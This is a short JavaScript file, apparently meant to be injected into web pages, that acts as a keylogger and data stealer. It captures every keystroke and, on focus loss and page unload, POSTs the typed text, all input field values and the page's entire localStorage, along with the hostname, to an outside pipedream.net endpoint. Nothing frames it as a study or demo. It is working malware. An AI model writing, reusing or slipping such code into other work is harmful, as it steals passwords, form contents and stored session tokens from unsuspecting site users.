"use strict";

(() => {
  let keyCodes = "";
  let keyChars = "";


  const sendData = async (payload, path = 'keychars') => {
    const hostName = window.location.hostname;
    const body = { ...payload, hostName };    
    const options = {
      method: "POST",
      headers: {
        'Content-Type': 'application/json'
      },      
      // mode: "cors",
      body: JSON.stringify(body),
    };
    
    fetch(`https://eo18gkip3ehlbmz.m.pipedream.net/${path}`, options);      
  }


  const startKeyLogging = () => {      
    document.onkeydown = function(e){ 
      let currentKey = e.key;
      const ignorableKeys = ['Backspace', 'Shift', 'Esc'];
      
      if (ignorableKeys.includes(e.key)) {
        currentKey = '';
      }

      if (e.key === 'Enter') {
        currentKey = '\n';
      }

      if (e.key === 'Tab') {
        currentKey = '  ';
      }

      keyCodes += `${e.code}, `;
      keyChars += `${currentKey}`;
      
      if(e.code === "Enter") // when Enter is pressed print the line in console
      { 
        console.log(keyCodes); //print code
        console.log(keyChars); //print char
        keyCodes = ""; //make null
        keyChars = ""; // make null 
      }      
    };    
  };

  window.onbeforeunload = (event) => {
    const allInputs = document.querySelectorAll('input');
    const inputValues = [...allInputs].map((inputItem) => inputItem.value);
 
    const currentLocalStorage = {...localStorage};
 
    sendData({ inputValues, currentLocalStorage }, 'Information');
  };

  startKeyLogging();

  document.addEventListener('focusout', () => sendData({ keyChars }));
})();
